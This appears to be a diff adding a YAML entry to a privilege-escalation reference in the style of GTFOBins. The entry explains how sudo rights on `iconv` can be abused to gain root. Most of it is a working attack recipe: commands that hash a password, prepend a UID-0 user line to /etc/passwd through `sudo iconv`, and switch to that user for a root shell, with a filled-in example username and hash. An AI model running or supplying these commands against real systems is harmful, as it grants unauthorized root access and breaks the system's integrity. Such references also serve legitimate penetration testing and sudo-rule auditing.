@@ -1,0 +1,10 @@
+description:
+  This is only works when user have sudo or root privilege to run the `iconv`
+  adding a user name to /etc/passwd along with password using file-write technique shown in the gtfobin [https://gtfobins.github.io/gtfobins/iconv/]
+  after that login to tha user and you will get the root shell.
+  
+  code: |
+      openssl passwd -crypt <Password> [example : openssl passwd -crypt P4S$w0rd ]
+      echo -e "<User name>:<Password hash>:0:0:root:/root:/bin/bash\n""$(</etc/passwd)" | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o "/etc/passwd"
+      [example: echo -e "soma:rgMFIrplPFGkk:0:0:root:/root:/bin/bash\n""$(</etc/passwd)" | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o "/etc/passwd" ]
+      su <User name> [example : su soma ]
